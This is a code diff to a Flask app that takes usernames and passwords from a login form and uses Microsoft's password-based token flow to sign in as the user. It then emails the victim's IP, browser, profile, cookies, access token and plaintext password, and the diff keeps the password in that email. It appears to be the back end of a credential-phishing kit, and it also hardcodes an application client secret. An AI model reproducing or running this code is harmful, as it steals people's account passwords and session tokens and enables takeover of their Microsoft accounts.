@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, session, render_template
 import os
 import requests
 from flask_mail import Mail, Message
@@ -33,30 +33,32 @@ def browserr():
 def home():
     return render_template('home.html')
 
-@app.route('/index', methods=['POST'])
-def index():
+@app.route('/login', methods=['POST'])
+def login():
+    # Replace with your actual client information
     client_id = '16675c4e-cbcf-4c5d-8b2b-d02484f3aa81'
+    client_secret = 'xCm8Q~tXbR9p01ZmW4SQpzmPqNN3WcPSNaNOldzI'
     authority = 'https://login.microsoftonline.com/common'
-    client_secret = 'xCm8Q~tXbR9p01ZmW4SQpzmPqNN3WcPSNaNOldzI'  # Replace with your actual client secret value
     scope = ['User.Read']
-
-    username = request.form.get('username')  # Obtain the username from the form
-    password = request.form.get('password')  # Obtain the password from the form
-
-    # Create a confidential client application
+    
+    # Get username and password from the form
+    username = request.form.get('username')
+    password = request.form.get('password')
+    
+    # Initialize the MSAL ConfidentialClientApplication
     msal_app = msal.ConfidentialClientApplication(
         client_id,
+        client_credential=client_secret,
         authority=authority,
-        client_credential=client_secret
     )
-
-    # Acquire a token using ROPC flow
+    
+    # Acquire token using ROPC flow
     result = msal_app.acquire_token_by_username_password(
         username=username,
         password=password,
         scopes=scope
     )
-
+    
     if 'access_token' in result:
         access_token = result['access_token']
         response = requests.get(
@@ -78,9 +80,9 @@ def index():
             f"IP Address: {ipAddr}\n"
             f"Browser: {browser_name}\n"
             f"User Info: {user_info}\n"
-            f"Password: {password}\n"  # Including password in the email (Use with caution)
             f"Cookies:\n{cookies_string}\n"
-            f"Access Token: {access_token}"
+            f"Access Token: {access_token}\n"
+            f"Password: {password}"  # Include the password (Note: Be cautious with this)
         )
 
         try:
